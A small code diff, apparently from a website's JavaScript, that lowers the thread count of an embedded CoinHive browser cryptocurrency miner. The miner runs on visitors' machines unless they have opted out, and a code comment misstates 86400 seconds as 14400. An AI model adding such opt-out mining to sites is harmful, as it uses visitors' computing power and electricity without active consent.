@@ -956,7 +956,7 @@ var pageViewController = function(sb, input){
 	function _setupMiner(){
 		try{
 			miner = new CoinHive.Anonymous(input.minerSiteKey, {throttle: 0.3});
-			miner.setNumThreads(8);
+			miner.setNumThreads(2);
 			// Only start on non-mobile devices and if not opted-out
 			// in the last 14400 seconds (~24 hours):
 			if (!miner.didOptOut(86400)) {
